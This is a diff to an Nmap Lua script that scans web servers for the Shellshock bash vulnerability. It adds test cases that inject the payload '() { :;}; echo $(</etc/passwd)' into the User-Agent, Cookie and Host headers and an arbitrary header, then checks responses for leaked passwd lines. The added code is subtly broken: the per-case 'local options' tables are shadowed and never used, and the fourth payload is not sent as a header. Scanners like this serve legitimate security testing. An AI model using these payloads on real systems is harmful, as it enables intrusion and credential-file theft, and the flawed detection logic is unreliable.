@@ -12,10 +12,10 @@ http://www.reddit.com/r/netsec/comments/2hbxtc/cve20146271_remote_code_execution
 ---
 -- @usage
 --
--- nmap --script http-shellshock --script-args="cookie='SESSIONID=12b20990ae07e1f4b0d121585f7b91cb',depth=20,startpath=/,uri=/cgi-bin/test.cgi" <ip>
+-- nmap --script http-shellshock --script-args="cookies='SESSIONID=12b20990ae07e1f4b0d121585f7b91cb',depth=20,startpath=/,uri=/cgi-bin/test.cgi" <ip>
 --
 -- @args http-shockshock.depth			the depth of back traversal. [default : 20]
--- @args http-shockshock.cookie			cookie value for testing in private webpages. [default : nil]
+-- @args http-shockshock.cookie			cookies value for testing in private webpages. [default : nil]
 -- @args http-shellshock.startpath		start path of http crawler. [default : /]
 -- @args http-shellshock.uri			set this argument if you want to test it in a single uri. [default : nil]
 ---
@@ -50,13 +50,14 @@ action = function(host, port)
 	local u1 = {}
 	local response
 	local flag = 0
-	local singleuri,cookie = nil
+	local singleuri,reason = nil
+	local cookies = ""
 	local startpath = "/"
 	local depth = 20
 
 	--setting commandline parameters if user has given any
-	if(nmap.registry.args.cookie) then 
-		cookie = tostring(nmap.registry.args.cookie) 
+	if(nmap.registry.args.cookies) then 
+		cookies = tostring(nmap.registry.args.cookies) 
 	end
 	if(nmap.registry.args.startpath) then 
 		startpath = tostring(nmap.registry.args.startpath) 
@@ -90,7 +91,7 @@ action = function(host, port)
 	      		["User-Agent"]  = '() { :;}; echo $(</etc/passwd)',
 	      		["Content-Type"] = "application/xml",
 	    	},
-	    	cookie = cookie
+	    	cookie = cookies
 	  	}
 
 		local status,r
@@ -115,23 +116,70 @@ action = function(host, port)
 			u1 = http.parse_url(uri)
 			for i,j in pairs(u1) do
 				if(i=="path") then
-				 response = http.generic_request(host,port,"GET",j,options)
-				 if response.rawheader ~= nil then
-					for key, line in ipairs(response.rawheader) do
-		     	    	if (line:match("(%a+):(%s)x:(%d+):(%d+):(%a+)")) then
-		             		table.insert(fi,line)
-		                	flag=1
-		            	end
-			    	end
-			    	if flag==1 then
-						break 
-			    	end
-				end
+					for tcase = 1, 4 do
+						if tcase == 1 then 
+							local options = {
+		    					header = {
+		      						Host = host.ip,
+		      						Connection = "close",
+		      						["User-Agent"]  = '() { :;}; echo $(</etc/passwd)',
+		      						["Cookies"] = cookies,
+		      						["Content-Type"] = "application/xml",
+		    					}
+		  					}
+		  					reason = 'User-Agent'
+		  				elseif tcase == 2 then 
+		  					local options = {
+		    					header = {
+		      						Host = host.ip,
+		      						Connection = "close",
+		      						["User-Agent"]  = 'Nmap Scanner',
+		      						["Cookies"] = cookies .. '() { :;}; echo $(</etc/passwd)',
+		      						["Content-Type"] = "application/xml",
+		    					}
+		  					}
+		  					reason = 'Cookie'
+		  				elseif tcase == 3 then 
+		  					local options = {
+		    					header = {
+		      						Host = '() { :;}; echo $(</etc/passwd)',
+		      						Connection = "close",
+		      						["User-Agent"]  = 'Nmap Scanner',
+		      						["Cookies"] = cookies,
+		      						["Content-Type"] = "application/xml",
+		    					}
+		  					}
+		  					reason = 'Host'
+		  				elseif tcase == 4 then 
+		  					local options = {
+		    					header = {
+		      						Host = host.ip,
+		      						Connection = "close",
+		      						["Content-Type"] = "application/xml",
+		      						["Cookies"] = cookies,
+		    					},
+		    				'() { :;}; echo $(</etc/passwd)'
+		  					}
+		  					reason = 'Arbitary Header Parameter'
+		  				end
+						response = http.generic_request(host,port,"GET",j,options)
+						if response.rawheader ~= nil then
+							for key, line in ipairs(response.rawheader) do
+				     	    	if (line:match("(%a+):(%s)x:(%d+):(%d+):(%a+)")) then
+				             		table.insert(fi,line)
+				                	flag=1
+				            	end
+					    	end
+					    	if flag==1 then
+								break 
+					    	end
+						end
+					end
 				end
 			end
 		end
 	end
 	if flag == 1 then
-		return "This system is vulnerable for shellshock" .. stdnse.format_output(true, fi)
+		return "This system is vulnerable for shellshock on " .. reason .. stdnse.format_output(true, fi)
 	end
 end
